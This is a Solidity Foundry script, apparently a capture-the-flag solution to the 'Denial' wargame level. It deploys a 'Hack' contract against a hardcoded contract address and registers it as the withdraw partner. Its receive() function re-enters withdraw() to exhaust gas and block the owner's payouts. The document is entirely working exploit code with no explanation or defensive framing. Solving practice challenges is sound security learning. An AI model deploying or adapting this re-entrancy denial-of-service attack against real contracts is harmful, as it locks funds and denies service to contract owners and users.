// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "../lib/forge-std/src/Script.sol";
import {Denial} from "../src/Denial.sol";

contract DenialScript is Script {
    Denial public denial;
    Hack public hack;

    function run() external {
        denial = Denial(payable(0xA9E594452C517593B42FAb8Ed033A1ee5454143c));
        pwn();
    }

    function pwn() public {
        vm.startBroadcast();
        hack = new Hack(denial);
        hack.becomeWithdrawPartner();
        vm.stopBroadcast();
    }
}

contract Hack {
    Denial public denial;

    constructor(Denial _denial) {
        denial = _denial;
    }

    function becomeWithdrawPartner() public {
        denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        denial.withdraw();
    }
}
